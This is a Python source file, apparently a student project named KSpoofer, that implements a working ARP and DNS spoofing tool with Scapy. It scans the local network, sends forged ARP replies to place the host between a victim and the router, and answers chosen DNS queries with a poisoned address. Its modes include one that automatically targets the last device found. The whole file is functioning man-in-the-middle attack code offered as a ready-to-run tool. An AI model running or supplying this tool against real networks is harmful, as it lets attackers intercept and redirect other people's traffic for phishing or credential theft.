# Author: Kajetan Knopp (1674404)

import argparse
import threading
import time
from scapy.all import *

def send_arp_request(ip, single = False, timeout = 5):
    request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    request_with_broadcast = broadcast / request
    if single:
        response = sr1(request_with_broadcast, timeout=timeout, verbose=False)
    else:
        response = srp(request_with_broadcast, timeout=timeout, verbose=False)[0]
    return response


def get_mac(ip):
    response = send_arp_request(ip)
    if response:
        return response[0][1].hwsrc
    else:
        raise Exception("Could not find MAC address for IP: " + ip)

def get_router_ip():
    router_ip = conf.route.route("0.0.0.0")[2]
    
    response = send_arp_request(router_ip)[0][1]
    
    if response:
        router_mac = response.hwsrc
        return router_ip, router_mac
    else:
        raise Exception("Could not find router IP address")


def list_devices():
    router_ip, _ = get_router_ip()

    # Get the interface and local IP address
    interface = conf.iface
    local_ip = get_if_addr(interface)
    local_mac = get_if_hwaddr(interface)
    
    # The IP range will start from the router IP
    ip_range = router_ip + "/24"
    
    print("LIST: Scanning for devices on the network " + ip_range + "...")
    print("Host IP: " + local_ip + ", MAC: " + local_mac + "\n")
    
    response = send_arp_request(ip_range)
    
    print("LIST: Other devices on the network:")
    devs = []
    for _, dev in response:
        print("IP: " + dev.psrc + ", MAC: " + dev.hwsrc)
        devs.append(dev.psrc)

    return devs


def arp_spoof(victim, poison):
    victim_mac = get_mac(victim)
    packet = ARP(op=2, pdst=victim, hwdst=victim_mac, psrc=poison)
    send(packet, verbose=False)

def begin_arp_spoof(victim, router):
    print("ARP: Beginning the ARP spoofing...")
    while True:
        arp_spoof(victim, router)
        arp_spoof(router, victim)
        print("ARP: Sent packets for victim: " + victim + " and router: " + router)
        time.sleep(5)

def dns_spoof(pkt, victim_domain, poison_domain):
    # Check if the packet is a DNS query
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        # Get rid of the trailing dot in the domain name
        requested_domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
        if requested_domain == victim_domain:
            dns_packet =  IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=poison_domain))
            send(dns_packet, verbose=False)
            print("DNS: Sent packets for victim: " + victim_domain + " to poisoned IP: " + pkt[IP].src)

def handle_dns(pkt, victim_domain, poison_domain):
    dns_spoof(pkt, victim_domain, poison_domain)

def start_dns_spoof(victim_domain, poison_domain):
    print("DNS: Commencing DNS spoofing, victim domain: " + victim_domain + ", poison domain: " + poison_domain)
    sniff(filter="udp port 53", prn=lambda pkt: handle_dns(pkt, victim_domain, poison_domain), store=0)

def autorun_attack(victim_domain, poison_domain, victim_ip = False):
    router_ip, _ = get_router_ip()

    if not victim_ip:
        victim_ip = sorted(list_devices())[-1]
    
    t1 = threading.Thread(target=begin_arp_spoof, args=(victim_ip, router_ip))
    t2 = threading.Thread(target=start_dns_spoof, args=(victim_domain, poison_domain))

    t1.start()
    t2.start()
    t1.join()
    t2.join()

def main():
    parser = argparse.ArgumentParser(description="KSpoofer is an ARP/DNS spoofer tool built on top of Scapy (Python).")

    # Add the available arguments
    parser.add_argument("-a", "--arp", nargs=2, metavar=("VICTIM_IP", "GATEWAY_IP"), help="Begin ARP spoofing attack")
    parser.add_argument("-d", "--dns", nargs=2, metavar=("DOMAIN", "POISON_DOMAIN"), help="Begin DNS spoofing attack")
    parser.add_argument("-b", "--both", nargs=4, metavar=("VICTIM_IP", "GATEWAY_IP", "DOMAIN", "POISON_DOMAIN"), help="Begin DNS spoofing with ARP poisoning attack")
    parser.add_argument("-l", "--list", action="store_true", help="List other devices on the network")
    parser.add_argument("-r", "--autorun", nargs=3, metavar=("DOMAIN", "POISON_DOMAIN", "VICTIM_IP"), help="Automatically run the DNS+ARP attack on the specified device")
    parser.add_argument("-f", "--fullautorun", nargs=2, metavar=("DOMAIN", "POISON_DOMAIN"), help="Automatically run the DNS+ARP attack on the last device found")

    args = parser.parse_args()

    if args.list:
        list_devices()
    elif args.arp and len(args.arp) == 2:
        victim_ip, gateway_ip = args.arp
        begin_arp_spoof(victim_ip, gateway_ip)
    elif args.dns and len(args.dns) == 2:
        victim_domain, poison_domain = args.dns
        start_dns_spoof(victim_domain, poison_domain)
    elif args.both and len(args.both) == 4:
        victim_ip, gateway_ip, victim_domain, poison_domain = args.both
        t1 = threading.Thread(target=begin_arp_spoof, args=(victim_ip, gateway_ip))
        t2 = threading.Thread(target=start_dns_spoof, args=(victim_domain, poison_domain))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    elif args.autorun and len(args.autorun) == 3:
        victim_domain, poison_domain, victim_ip = args.autorun
        autorun_attack(victim_domain, poison_domain, victim_ip)
    elif args.fullautorun and len(args.fullautorun) == 2:
        victim_domain, poison_domain = args.fullautorun
        autorun_attack(victim_domain, poison_domain)
    else:
        print("Invalid arguments provided. Please see the help menu for more information.")
        parser.print_help()

if __name__ == "__main__":
    main()
